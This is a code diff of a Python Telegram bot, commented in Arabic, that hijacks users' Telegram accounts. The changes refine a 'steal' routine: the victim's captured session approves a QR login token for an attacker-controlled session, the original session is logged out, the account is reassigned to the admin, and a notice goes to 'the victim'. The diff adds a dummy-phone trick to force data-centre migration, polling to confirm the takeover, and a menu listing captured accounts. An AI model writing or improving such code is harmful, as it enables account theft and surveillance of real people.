@@ -1,4 +1,4 @@
-# --- START OF FILE Paste May 31, 2026 - 6:15PM ---
+# --- START OF FILE Paste May 31, 2026 - 6:39PM ---
 
 import os
 import re
@@ -77,18 +77,12 @@ def init_db():
     c = conn.cursor()
     c.execute("PRAGMA journal_mode=WAL;")
     c.execute(''' CREATE TABLE IF NOT EXISTS sessions ( id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, auto_term_enabled INTEGER DEFAULT 0, auto_term_interval INTEGER DEFAULT 24, last_term_attempt INTEGER DEFAULT 0 ) ''')
-    try:
-        c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
-    except:
-        pass
-    try:
-        c.execute("ALTER TABLE sessions ADD COLUMN dc_id INTEGER DEFAULT 2")
-    except:
-        pass
-    try:
-        c.execute("ALTER TABLE sessions ADD COLUMN auth_hex TEXT DEFAULT ''")
-    except:
-        pass
+    try: c.execute("ALTER TABLE sessions ADD COLUMN surveilled INTEGER DEFAULT 0")
+    except: pass
+    try: c.execute("ALTER TABLE sessions ADD COLUMN dc_id INTEGER DEFAULT 2")
+    except: pass
+    try: c.execute("ALTER TABLE sessions ADD COLUMN auth_hex TEXT DEFAULT ''")
+    except: pass
     c.execute(''' CREATE TABLE IF NOT EXISTS allowed_users ( user_id INTEGER PRIMARY KEY, first_name TEXT ) ''')
     conn.commit()
     conn.close()
@@ -162,6 +156,15 @@ def get_all_allowed_users():
     conn.close()
     return rows
 
+def get_sender_name(user_id):
+    if user_id in ADMIN_IDS: return "المطور"
+    conn = get_db_conn()
+    c = conn.cursor()
+    c.execute("SELECT first_name FROM allowed_users WHERE user_id=?", (user_id,))
+    res = c.fetchone()
+    conn.close()
+    return res[0] if res else "مجهول"
+
 init_db()
 
 # =========================================================
@@ -186,26 +189,6 @@ def get_creation_year(user_id):
         else: return "2026+"
     except Exception:
         return "مـجـهـول"
-
-def get_country_info(phone):
-    phone = str(phone).replace("+", "")
-    countries = {
-        "967": "اليمن 🇾🇪", "964": "العراق 🇮🇶", "966": "السعودية 🇸🇦",
-        "20": "مصر 🇪🇬", "963": "سوريا 🇸🇾", "218": "ليبيا 🇱🇾",
-        "249": "السودان 🇸🇩", "213": "الجزائر 🇩🇿", "212": "المغرب 🇲🇦",
-        "971": "الإمارات 🇦🇪", "965": "الكويت 🇰🇼", "968": "عُمان 🇴🇲",
-        "974": "قطر 🇶🇦", "973": "البحرين 🇧🇭", "962": "الأردن 🇯🇴",
-        "961": "لبنان 🇱🇧", "970": "فلسطين 🇵🇸", "972": "إسرائيل/فلسطين 📍",
-        "1": "أمريكا/كندا 🇺🇸", "44": "بريطانيا 🇬🇧", "7": "روسيا 🇷🇺",
-        "98": "إيران 🇮🇷", "90": "تركيا 🇹🇷", "49": "ألمانيا 🇩🇪",
-        "33": "فرنسا 🇫🇷", "39": "إيطاليا 🇮🇹", "34": "إسبانيا 🇪🇸",
-        "62": "إندونيسيا 🇮🇩", "60": "ماليزيا 🇲🇾", "91": "الهند 🇮🇳",
-        "92": "باكستان 🇵🇰", "86": "الصين 🇨🇳", "55": "البرازيل 🇧🇷"
-    }
-    for code in sorted(countries.keys(), key=len, reverse=True):
-        if phone.startswith(code):
-            return countries[code]
-    return "دولي 🌍"
 
 def get_dc_ip(dc_id):
     return {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}.get(dc_id, "149.154.167.51")
@@ -298,7 +281,7 @@ def log_to_channel(text, file_path=None, session_text=None):
         logging.error(f"فشل إرسال للقناة: {e}")
 
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name, saved_dc_id, saved_hex):
-    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (تم حل مشكلة الـ Buffer)"""
+    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (تحديث 2026 الشامل لحل مشكلة الـ 404)"""
 
     B_DEVICE_MODEL = f"MigrationB_{acc_id}"
     client_b = None
@@ -340,44 +323,64 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         me_raw = await client_a.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
         target_dc = me_raw[0].dc_id if me_raw and hasattr(me_raw[0], 'dc_id') else saved_dc_id
 
-        # 3. بناء الجلسة B بـ Pack متوافق مع Pyrogram V2 بضبط طوله على 271 bytes لتجنب خطأ Unpack buffer
-        empty_auth_key = b"\x00" * 256
-        packed = struct.pack(">BI?256sQ?", target_dc, API_ID, False, empty_auth_key, 0, False)
-        session_string_for_b = base64.urlsafe_b64encode(packed).decode().rstrip("=")
-
-        # 4. إنشاء الجلسة B على السيرفر الصحيح
+        # 3. إنشاء الجلسة B بدون String لضمان أن Pyrogram تولد مفتاحاً حقيقياً وتتجنب 404 Auth Key Not Found
         client_b = Client(
             f"cb_{acc_id}_{int(time.time())}", 
             api_id=API_ID, 
             api_hash=API_HASH, 
-            session_string=session_string_for_b, 
             in_memory=True,
             device_model=B_DEVICE_MODEL
         ) 
         await client_b.connect()
 
-        # 5. طلب رمز تسجيل الدخول لـ B
+        # 4. خدعة حصرية: إجبار Client B على الانتقال للسيرفر الصحيح وبناء AuthKey سليم قبل طلب الـ QR
+        if target_dc and target_dc != 2:
+            dummy_phone = f"+{target_dc}7770000000"
+            try:
+                # هذه الخطوة ستفشل ولكن Pyrogram سيقوم بالانتقال خلف الكواليس وتوليد مفتاح صحيح للـ DC المطلوب!
+                await client_b.send_code(dummy_phone)
+            except Exception:
+                pass 
+
+        # 5. طلب رمز تسجيل الدخول لـ B بأمان
         qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
         if isinstance(qr, types.auth.LoginTokenMigrateTo):
-            await client_b.disconnect()
-            packed_retry = struct.pack(">BI?256sQ?", qr.dc_id, API_ID, False, empty_auth_key, 0, False)
-            session_string_for_b = base64.urlsafe_b64encode(packed_retry).decode().rstrip("=")
-            client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string_for_b, in_memory=True, device_model=B_DEVICE_MODEL)
-            await client_b.connect()
+            dummy_phone_retry = f"+{qr.dc_id}7770000000"
+            try:
+                await client_b.send_code(dummy_phone_retry)
+            except Exception:
+                pass
             qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
         # 6. الجلسة A توافق على الرمز
         if isinstance(qr, types.auth.LoginToken):
             await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
 
-            await asyncio.sleep(5) 
+            # 7. فحص قبول الدخول عبر Polling للجلسة B لمنع فقدان الحساب
+            logged_in = False
+            for _ in range(6):
+                await asyncio.sleep(1.5)
+                poll = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
+                if isinstance(poll, types.auth.LoginTokenSuccess):
+                    logged_in = True
+                    break
+            
+            if not logged_in:
+                try:
+                    await client_b.get_me()
+                    logged_in = True
+                except Exception:
+                    pass
 
-            # 7. تصدير الجلسة B كسلسلة نصية كاملة الصلاحيات
+            if not logged_in:
+                raise Exception("فشلت الجلسة B في تأكيد الموافقة من الجلسة A")
+
+            # 8. تصدير الجلسة B كسلسلة نصية كاملة الصلاحيات
             session_b_str = await client_b.export_session_string()
             await client_b.disconnect()
 
-            # 8. فحص الجلسة الجديدة واستخراج الـ HEX الجديد
+            # 9. فحص الجلسة الجديدة واستخراج الـ HEX الجديد النظيف 100%
             verify_b = Client(f"vb_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_b_str, in_memory=True)
             await verify_b.connect()
             me_b = await verify_b.get_me()
@@ -390,7 +393,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             
             await verify_b.disconnect()
 
-            # 9. الجلسة A تسجل خروج بنفسها
+            # 10. الجلسة A تسجل خروج بنفسها
             try:
                 await client_a.invoke(functions.auth.LogOut())
             except Exception: 
@@ -398,14 +401,14 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
             if client_a.is_connected: await client_a.disconnect()
 
-            # 10. تحديث الداتا بيس
+            # 11. تحديث الداتا بيس
             conn = get_db_conn()
             c = conn.cursor()
             c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='', dc_id=?, auth_hex=? WHERE id=?", (session_b_str, admin_id, new_dc_id, new_hex_key, acc_id))
             conn.commit()
             conn.close()
 
-            # 11. إرسال الكليشة للضحية
+            # 12. إرسال الكليشة للضحية
             kick_msg = (
                 f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
                 f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
@@ -418,7 +421,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             except Exception: 
                 pass
 
-            # 12. رسالة الأدمن
+            # 13. رسالة الأدمن
             admin_msg = (
                 f"✅ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
                 f"⎉╎ الـرقـم: `{phone}`\n"
@@ -836,7 +839,6 @@ def process_successful_login(message, status_msg, me, pyro_session, session_type
         bot.edit_message_text("⚠️ الـحـسـاب مـوجـود بـالـفـعـل فـي الـبـوت مـسـبـقـاً!", message.chat.id, status_msg.message_id, reply_markup=home_keyboard(message.from_user.id))
         return
 
-    # التخزين الذكي للـ Hex والسيرفر معاً
     final_hex = raw_hex
     if not final_hex:
         _, final_hex = parse_pyro_session(pyro_session)
@@ -1026,8 +1028,11 @@ async def check_account_for_menu(acc):
         if client.is_connected: await client.disconnect()
 
     creation_year = get_creation_year(uid)
-    country_info = get_country_info(phone)
-    btn_text = f"{color} {name} | {country_info} | {creation_year}"
+    sender_name = get_sender_name(owner_id)
+    short_phone = f"+{str(phone).replace('+', '')[:5]}"
+    
+    # الترتيب المطلوب: اللون | اسم المُرسل | اسم الحساب | الآيدي | سنة الإنشاء | أول 5 أرقام
+    btn_text = f"{color} {sender_name} | {name} | {uid} | {creation_year} | {short_phone}"
     return InlineKeyboardButton(btn_text, callback_data=f"steal:{acc_id}")
 
 async def build_steal_menu_async(admin_id, chat_id, msg_id):
@@ -1054,7 +1059,7 @@ def handle_steal(call):
     if call.from_user.id not in ADMIN_IDS: return
     target = call.data.split(":")[1]
 
-    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر (Cloning)...", parse_mode="Markdown")
+    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر بـأقـصـى قـوة...", parse_mode="Markdown")
 
     if target == "all":
         conn = get_db_conn()
